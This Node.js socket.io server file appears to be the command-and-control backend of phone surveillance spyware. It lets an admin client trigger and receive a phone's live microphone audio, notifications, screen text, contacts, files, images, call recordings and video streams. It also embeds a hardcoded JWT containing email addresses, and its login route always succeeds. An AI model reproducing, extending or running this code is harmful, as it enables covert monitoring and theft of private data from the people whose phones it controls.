const express = require("express");
const app = express();
const http = require("http");
const server = http.createServer(app);
const { sendMail } = require("./mailer");
const { Events } = require("./EventConstants");
const fs = require("fs");
const { handlePcmData } = require("./wavefilewrter");
// const { EncodeOgg } = require("./oggWriter");
const wav = require("wav");

// Create a writable stream to save the wave file
const outputStream = fs.createWriteStream("received_file.wav");

let ClientID = "";

let PhoneID = "";

// Create a new wave file writer with the specified options
const writer = new wav.FileWriter("received_file.wav", {
  sampleRate: 44100, // Sample rate in Hz
  channels: 2, // Mono
  bitDepth: "32", // 16-bit sample depth
});

app.use(express.json());

const io = require("socket.io")(server, {
  maxHttpBufferSize: 1e8,
  pingTimeout: 80000,
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});

const cors = require("cors");

const WaveFile = require("wavefile").WaveFile;
const logger = require("./loggerconfig/logger.js");
const { log } = require("console");
const { resolveSoa } = require("dns");
let socketConnections = [];

const key = fs.readFileSync("private.key");
const cert = fs.readFileSync("certificate.crt");
app.use(
  cors({
    origin: "*",
    // methods: [],
  })
);

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/hello.html");
});
app.get("/qr", (req, res) => {
  res.sendFile(__dirname + "/qrcode.txt");
});
app.get("/audio", (req, res) => {
  res.sendFile(__dirname + "/hello.wav");
});
app.get("/pcm", (req, res) => {
  logger.info("sending pcm library");
  res.sendFile(__dirname + "/pcm-player.js");
});

io.on("connection", async (socket) => {
  socketConnections.push(socket.id);
  const { role } = socket.handshake.auth;
  if (role === "admin") {
    ClientID = socket.id;
    logger.info("CLient is Connected  Established with socket: " + socket.id);
  } else {
    PhoneID = socket.id;
    logger.info("Phone is Connected Established with socket: " + socket.id);
  }

  // console.log(socket);
  logger.info("connection Established with socket: " + socket.id);

  socket.on("disconnect", (socket) => {
    logger.info("user uid disconnected:::::::::");
  });

  socket.on(Events.AudioPcmData, async (audioData) => {
    // socket.broadcast.emit("audiodata", audioData);/
    io.to(ClientID).emit("audiodata", audioData);
    // logger.info("audiodata");/
    // logger.info("Sending Audio Data to device:: ", audioData);
    // EncodeOgg(audioData);
    writer.write(audioData);
    handlePcmData(audioData);
    // logger.info("Audio Data sent to device:: ", "[1,2...]");
  });
  socket.on(Events.NotificationPostedEvent, (data) => {
    // logger.info("dataLOG" + data);
    // socket.broadcast.emit("onNotification", data);
    io.to(ClientID).emit("onNotification", data);
  });
  socket.on("screenTextEvent", (data) => {
    io.to(ClientID).emit("onScreenText", data);
    logger.info("onScreenText", data);
  });

  socket.on("log", (data) => {
    // logger.info(":broadcasting Notification " + data);
    socket.broadcast.emit("notificationLogs", data);
  });

  // get files and folder in side forede
  socket.on("getFilesAndFolders", (data) => {
    // socket.broadcast.emit("foldersAndFiles", data);
    io.to(ClientID).emit("foldersAndFiles", data);
  });

  // download files and folders
  socket.on("uploadTOServer", (data) => {
    // logger.info("bas64 url is " + JSON.stringify(data));
    socket.broadcast.emit("downloadFile", data);
    // io.to.
  });
  socket.on("OnSystemError", (data) => {
    logger.info("OnSystemError" + data);
  });

  socket.on("downloadAllContacts", (data) => {
    // logger.info("downloadAllContacts" + JSON.stringify(data));
    socket.broadcast.emit("getAllContactsAndNames", data);
  });
  socket.on("e#postRootFiles", (data) => {
    // socket.broadcast.emit("getBaseFoldersAndFiles", data);
    io.to(ClientID).emit("getBaseFoldersAndFiles", data);
  });
  socket.on("sendByPath", (data) => {
    socket.broadcast.emit("getBaseFoldersAndFiles", data);
  });
  socket.on("uplaodImageformPhone", (data) => {
    socket.broadcast.emit("downlaodImage", data);
  });

  // video stream start
  socket.on("reciveStream", (data) => {
    io.to(ClientID).emit("playVideo", data);
    logger.info("video stream started" + data);
  });
});

app.get("/getSocket", async (req, res) => {
  logger.info(" getting socket connections list");
  let conn = [];
  logger.info("getting socket connections list");
  logger.info(
    "socket connections list:------------------>{} " + socketConnections
  );
  logger.info("getting socket connections list End");
  const ids = await io.allSockets();
  ids.forEach(function (value) {
    conn.push(value);
  });
  logger.info("latest updated clients list:---------->", conn);
  socketConnections = conn;
  res.send(socketConnections);
});

app.get("/startAudio", (req, res) => {
  logger.info("starting audio of client id ");
  startPcmData();
  res.send({ status: "200" });
});

app.get("/stopAudio", (req, res) => {
  stopPcmData();
  res.send({ status: "500" });
});
app.post("/getFiles_with_path", (req, res) => {
  let data = req.body;
  logger.info("getting files with path");
  for (let id of data.sockets) {
    logger.info("socket list " + id);
    io.to(id).emit("e#getFilesAndFolders", data?.path);
  }
  res.send({ status: "200" });
});
app.post("/download_file_path", (req, res) => {
  let body = req.body;
  let path = body.path;

  path = path.replace("/storage/emulated/0/", "");
  for (let obj of body.socketId) {
    logger.info("Downloading file" + "    " + path);
    io.to(obj).emit("uploadFiletosever", path);
  }
  res.send({ status: "200" });
});

app.post("/streamVideo", (req, res) => {
  logger.info("stream video started :: " + req.body.path);
  io.to(PhoneID).emit("startVideoStream", req.body.path);
  io.to(ClientID).emit("streamvideo", {});
  res.send({ status: 200 });
});

app.post("/downloadZip", async (req, res) => {
  const filePath = "file.zip"; // Specify the desired path

  const fileStream = fs.createWriteStream(filePath, { flags: "a" }); // Append mode

  req.on("error", (err) => {
    res.send({ status: err });
  });

  req.on("data", async (chunk) => {
    streamFileOverSocket(chunk);

    fileStream.write(chunk);
  });

  req.on("end", () => {
    fileStream.end();
    console.log("File uploaded successfully");
    streamingFileSocketEnd();
    res.sendStatus(200);
  });
});

app.post("/CallRecord", (req, res) => {
  let fileName = req.headers["file-name"];
  let date = new Date();
  let dateString =
    `${date.getDate()}-${date.getMonth()}-${date.getTime()}` + "callRecord.3gp";
  logger.info("saving the Record file with this File Name:: " + dateString);
  const fileStream = fs.createWriteStream(dateString, { flags: "a" });
  req.on("error", (err) => {
    logger.info(
      "Error saving the Record file with this File Name:: " +
        dateString +
        ": " +
        err
    );
  });
  req.on("data", (data) => {
    fileStream.write(data);
  });
  req.on("end", () => {
    logger.info("Stream Completed + " + dateString);
    res.send({ status: "200" });
  });
});

app.post("/getStreamBytes", (req, res) => {
  const filePath = "file.mp4"; // Specify the desired path
  const fileStream = fs.createWriteStream(filePath, { flags: "a" });
  io.to(ClientID).emit("streamStaredOpen", {});
  req.on("data", (data) => {
    // logger.info("File streamibng Bytes bytes: ");
    fileStream.write(data);

    streamVideoBytes(data);
  });
  req.on("end", () => {
    fileStream.end();
    io.to(ClientID).emit("streamEnd", {});
    res.send({ status: 200 });
  });
});

app.post("/streamAudioBytesAll", (req, res) => {
  logger.info("streamAudioBytes");
  req.on("data", (data) => {
    console.log("coming ", data);
    io.to(ClientID).emit("audiodata", data);
  });
  req.on("end", () => {
    res.send(200);
  });
});
let i = 0;

async function streamFileOverSocket(chunk) {
  i++;

  io.to(ClientID).emit("downlaodBytes", { data: chunk, value: i });
}
function streamVideoBytes(chunk) {
  i++;
  io.to(ClientID).emit("playVideo", { data: chunk, value: i });
}

async function streamingFileSocketEnd() {
  console.log("Streaming file");
  io.to(ClientID).emit("downloadCompleate", {});
}

// contacts

app.get("/contacts", async (req, res) => {
  logger.info("getting contacts");
  const ids = await io.allSockets();
  for (let id of ids) {
    logger.info("ids are: " + id);
    io.to(id).emit("getContacts", "stat");
  }
  res.send({ status: "200" });
});

app.post("/sendotp", (req, res) => {
  logger.info("sending otp");
  let response = {
    status: "200",
    msg: "otp sent successfully",
    success: 1,
  };
  res.send(response);
});

// files and storage folders
app.post("/uploadTotheServre", (req, res) => {
  logger.info(
    "requesting the clinet for uplaod folder as a zip file with  path " +
      req.body.path
  );
  io.to(PhoneID).emit("uploadTotheServre", req.body.path);
  res.send({ "hi ": "je;;p" });
});

app.post("/login", (req, res) => {
  logger.info("login request");
  let response = {
    success: 1,
    msg: "login successful",
    status: "200",
    token:
      "eyJhbGciOiJSUzI1NiJ9.eyJ1aWQiOiI1MTEiLCJzdWIiOiJhdmlzaGVrLnlhZGF2QHJlem8uYWkiLCJ1bm1lIjoibmFjY2h1IG9tc2FpIiwidWVtIjoibmFjY2h1Lm9tc2FpQHJlem8uYWkiLCJ1dCI6IkFkbWluIiwiY2lkIjoiOTEiLCJpYXQiOjE2NzYzNzQ0ODYsIm5iZiI6MTY3NjM3NDQ4NiwiZXhwIjoxNjc2Mzc4MDg2fQ.HFVwWHFvoo7ZI7j4COjZuV_HT2Fe94fDpkEkqcrKqM-uZ0deeqixbKcoMTkwl01sGcJP393KvOFyOH-w-QlJ972WjJtTsPE3ApnR0XqaONeo-njrU9l3zRCKtzRgfhhZhOcdU1ZNeDXfqUV4UA3vaV4CRDNkQH_GJ5gRkhJv10f5qISye6_Fn_7SMcUbWMUclVW82im2w13pH193LA4E9m6UchjXWpFCkHnppwzrr5FcVsX7fqfvA0kXtqWoplZoZvsFlCk83nAn0ItZ-Vfc8GZdTTzSU9Dw3ZxAVR1DHqnY2ZoFwIBBHqRaZjn8GPca_EWVGZPCD2tkrLbPxazEQg",
    user: {
      name: "Nacchu Omsai",
    },
  };
  res.send(response);
});
app.get("/cancelAll", async (req, res) => {
  logger.info("cancelling all downloads");

  io.to(PhoneID).emit("e#notification-cancel-all", "stat");

  res.send({});
});
app.post("/downloadImage", async (req, res) => {
  let body = req.body;
  let path = body.path;
  io.to(PhoneID).emit("ImageDownload", path);
  res.send({});
});

app.get("/getBaseFilesAndFolders", async (req, res) => {
  io.to(PhoneID).emit("e#getRootFiles", "");

  logger.info(
    "fetching base File and Folders form the servre phone with Client ID :: " +
      PhoneID
  );
  res.send({ status: 200 });
});
app.post("/fetchFolder", async (req, res) => {
  let body = req.body;
  let path = body.path;

  io.to(PhoneID).emit("e#getByPath", path);
  res.send({ status: 200 });
});

// start pcm data to server

function startPcmData() {
  logger.info("sending client for send pcm data with socket id{} ");
  io.to(PhoneID).emit(Events.AudioStart, "start");
  logger.info("succesfully sent requset to the client with socket id ");
}

function stopPcmData() {
  logger.info("stopping pcm data with socket id ");
  io.to(PhoneID).emit(Events.AudioStop, "stat");
}

const port = 8080;
server.listen(port, () => {
  logger.info("listening on port ", port);
});

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function triggerFunction() {
  sendMail();
}

setInterval(triggerFunction, 30 * 60 * 1000);

// function sendMail() {}

function DealerComponentWith() {}
